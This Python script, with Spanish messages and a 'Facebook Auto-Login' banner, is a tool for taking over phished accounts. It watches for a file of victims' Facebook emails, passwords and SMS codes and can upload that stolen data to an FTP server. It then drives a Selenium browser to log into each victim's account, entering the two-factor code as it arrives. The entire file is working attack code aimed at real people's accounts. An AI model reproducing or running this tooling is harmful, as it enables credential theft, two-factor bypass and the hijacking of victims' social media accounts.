from selenium import webdriver
import time
import sys
import json
import os
import time
import hashlib
import ftplib

def find(name, path):
    for root, dirs, files in os.walk(path):
        if name in files:
            return os.path.join(root, name)
    return False
    
def md5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def is_ftp():
	return int(len(sys.argv)) == int(2) and sys.argv[1] == 'ftp'

def upload_file(path_file, file_name, server, user, passwd):
	print("uploading file " + file_name +'.json')
	session = ftplib.FTP(server, user, passwd)
	file = open(path_file,'rb')                  # file to send
	session.storbinary('STOR '+file_name+'.json', file)     # send the file
	file.close()                                    # close file and FTP
	session.quit()

def check_ftp_connection(server, user, passwd):
	try:
		session = ftplib.FTP(server, user, passwd)
		session.quit()

		return True
	except:
		return False

if is_ftp():
	server_ftp = input('FTP SERVER:')
	user_ftp = input('FTP USER:')
	pass_ftp = input('FTP PASSWORD:')
	ftp_file_name = input("Name of the file to Upload ('victims' by default PRESSING ENTER) : ") or "victims"

	if check_ftp_connection(server_ftp, user_ftp, pass_ftp):
		print("FTP Login Successful, wait")
		time.sleep(2)
	else:
		print("FTP Login Error, check credentials and rerun script")
		sys.exit()


print(""" 
88888888b  .d888888   a88888b.  88888888b  888888ba   .88888.   .88888.  dP     dP         
 88        d8'    88  d8'   `88  88         88    `8b d8'   `8b d8'   `8b 88   .d8'         
a88aaaa    88aaaaa88a 88        a88aaaa    a88aaaa8P' 88     88 88     88 88aaa8P'          
 88        88     88  88         88         88   `8b. 88     88 88     88 88   `8b.         
 88        88     88  Y8.   .88  88         88    .88 Y8.   .8P Y8.   .8P 88     88         
 dP        88     88   Y88888P'  88888888P  88888888P  `8888P'   `8888P'  dP     dP         
                                                                                            
                                                                                            
 .d888888  dP     dP d888888P  .88888.           dP         .88888.   .88888.  dP 888888ba  
d8'    88  88     88    88    d8'   `8b          88        d8'   `8b d8'   `88 88 88    `8b 
88aaaaa88a 88     88    88    88     88          88        88     88 88        88 88     88 
88     88  88     88    88    88     88 88888888 88        88     88 88   YP88 88 88     88 
88     88  Y8.   .8P    88    Y8.   .8P          88        Y8.   .8P Y8.   .88 88 88     88 
88     88  `Y88888P'    dP     `8888P'           88888888P  `8888P'   `88888'  dP dP     dP 
                                                                                                                                                                                        

Esperando contraseñas de las victimas, no cierres el script ...

  - By BorjaGalisteo
                                                                                            """)

first_time = True
victims_count = 0

while True:
	while True:
		time.sleep(2)
		file = find('datos-privados.json','../')
		if file != False:
			if first_time:
				first_time = False
				hash_file = md5(file)
				break
			else:
				if hash_file != md5(file):
					hash_file = md5(file)
					break



	with open(file) as f:
		victims = json.load(f)

	
	if len(victims) == victims_count:
		print("La victima puso el SMS code")

		if is_ftp():
			upload_file(file,ftp_file_name, server_ftp, user_ftp, pass_ftp)

		for hour in victims:
			data = victims[hour]
			sms_code = data['sms']

		time.sleep(2)
		second_fa_input = web.find_element_by_xpath('//*[@id="approvals_code"]')
		second_fa_input.send_keys(sms_code)
		web.find_element_by_xpath('//*[@id="checkpointSubmitButton"]').click()

		print('Aceptamos y pa\' dentro')
		continue
	else:
		print("Nueva Victima encontrada... Abriendo navegador")
		if is_ftp():
			upload_file(file,ftp_file_name, server_ftp, user_ftp, pass_ftp)
		victims_count = len(victims)

	for hour in victims:
		data = victims[hour]
		user_facebook = data['email_facebook']
		pawd_facebook = data['password_facebook']

	web = webdriver.Chrome()
	web.get('https://www.facebook.com/')
	time.sleep(2)
	web.find_element_by_xpath('/html/body/div[3]/div[2]/div/div/div/div/div[3]/button[2]').click()
	email = user_facebook

	email_input = web.find_element_by_xpath('/html/body/div[1]/div[2]/div[1]/div/div/div/div[2]/div/div[1]/form/div[1]/div[1]/input')

	email_input.send_keys(email)
	passw = pawd_facebook
	time.sleep(3)
	pssw_input = web.find_element_by_xpath('//*[@id="pass"]')

	pssw_input.send_keys(passw)
	time.sleep(2)
	enter = web.find_element_by_css_selector('button.selected')
	enter.click()
